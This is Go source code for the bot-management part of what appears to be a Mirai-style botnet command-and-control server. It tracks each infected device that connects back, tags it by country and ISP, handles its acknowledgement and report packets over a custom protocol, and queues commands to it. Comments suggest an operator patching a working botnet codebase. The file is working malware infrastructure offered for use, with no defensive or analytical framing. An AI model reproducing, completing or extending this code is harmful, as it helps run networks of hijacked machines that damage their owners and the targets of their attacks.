package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"time"
)

func generateBotID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("bot-%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

type Bot struct {
	id      string
	uid     int
	conn    net.Conn
	version byte
	arch    byte
	source  string
	dropped bool

	country  string // lowercase code: "de", "us", "br"...
	asn      string // number string: "24940"
	asnName  string // e.g. "Hetzner Online GmbH"
}

func NewBot(conn net.Conn, version byte, arch byte, source string) *Bot {
	// EXACT IP EXTRACTION from your working source
	ip := ""
	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		ip = addr.IP.String()
	}

	// EXACT SAME helpers
	country := GetCountryFromIP(ip)
	asn, asnName := GetASNFromIP(ip)

	return &Bot{
		id:      generateBotID(),
		uid:     -1,
		conn:    conn,
		version: version,
		arch:    arch,
		source:  source,
		country: country,
		asn:     asn,
		asnName: asnName,
	}
}

// Returns "Germany (de)" or "Unknown (??)"
func (this *Bot) CountryLabel() string {
	if this.country == "" || this.country == "unknown" {
		return "Unknown (??)"
	}
	name := countryNames[this.country]
	if name == "" {
		name = "Unknown"
	}
	return fmt.Sprintf("%s (%s)", name, this.country)
}

// Returns "Hetzner Online GmbH (AS24940)"
func (this *Bot) ASNLabel() string {
	if this.asn == "" || this.asn == "unknown" || this.asn == "0" {
		return "Unknown ISP"
	}
	return fmt.Sprintf("%s (AS%s)", this.asnName, this.asn)
}

// -----------------------------------------------------
// ? ADDED BACK FOR clientList.go COMPATIBILITY
// -----------------------------------------------------
func (this *Bot) remoteIPKey() string {
	if this.conn == nil {
		return ""
	}
	addr := this.conn.RemoteAddr()
	if addr == nil {
		return ""
	}
	host := addr.String()
	if host == "" {
		return ""
	}
	if ip, _, err := net.SplitHostPort(host); err == nil {
		host = ip
	}
	return host
}

func (this *Bot) Handle() {
	clientList.AddClient(this)
	defer clientList.DelClient(this)

	lenBuf := make([]byte, 2)
	for {
		this.conn.SetDeadline(time.Now().Add(180 * time.Second))
		if err := readXBytes(this.conn, lenBuf); err != nil {
			return
		}

		pktLen := binary.BigEndian.Uint16(lenBuf)
		if pktLen == 0 {
			if _, err := this.conn.Write(lenBuf); err != nil {
				return
			}
			continue
		}

		payload := make([]byte, pktLen)
		if err := readXBytes(this.conn, payload); err != nil {
			return
		}

		if pktLen >= 3 && payload[0] == cncOpAck {
			handleBotAck(this, payload)
			continue
		}
		if pktLen >= 3 && payload[0] == cncOpReport {
			handleBotReport(this, payload)
			continue
		}
	}
}

func (this *Bot) QueueBuf(buf []byte) {
	this.conn.Write(buf)
}